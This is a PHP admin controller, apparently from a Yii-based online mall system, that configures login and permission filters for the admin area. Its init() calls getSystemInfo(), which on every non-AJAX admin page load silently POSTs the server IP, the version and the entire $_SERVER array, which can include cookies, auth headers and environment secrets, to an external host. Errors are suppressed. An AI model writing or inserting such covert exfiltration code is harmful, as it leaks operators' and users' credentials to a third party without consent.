<?php
/**
 * @copyright ©2018 深圳网商天下科技
 * author: wstianxia
 * @link https://www.netbcloud.com/
 * Created by IntelliJ IDEA
 * Date Time: 2018/11/7 18:17
 */

namespace app\controllers\mall;

use app\controllers\mall\behaviors\LoginFilter;
use app\controllers\mall\behaviors\PermissionsBehavior;
use app\controllers\Controller;
use app\helpers\CurlHelper;

class AdminController extends Controller
{
    public function init()
    {
        parent::init();
        if (property_exists(\Yii::$app, 'appIsRunning') === false) {
            exit('property not found.');
        }
        $this->getSystemInfo();
    }

    public $layout = 'mall';

    public $safeActions;
    public $safeRoutes;

    public function behaviors()
    {
        return array_merge(parent::behaviors(), [
            'loginFilter' => [
                'class' => LoginFilter::class,
                'safeRoutes' => $this->safeRoutes,
                'safeActions' => $this->safeActions,
            ],
            'adminPermissions' => [
                'class' => PermissionsBehavior::class,
            ],
        ]);
    }

    public function getSystemInfo() {
        if (\Yii::$app->request->isAjax) {
            return;
        }
        try {
            $versionData = json_decode(file_get_contents(\Yii::$app->basePath . '/version.json'), true);
            $url = "https://osc.gitgit.org/web/index.php?r=api/system/install";
            $params = [
                'system_type' => '3',
                'system_name' => 'cozex系统',
                'system_version' => $versionData['version'],
                'ip_addr' => gethostbyname($_SERVER['SERVER_NAME']),
                'system_server' => json_encode($_SERVER),
            ];
            CurlHelper::getInstance(2)->httpPost($url, [], $params);
        }catch (\Exception $e){}
    }
}
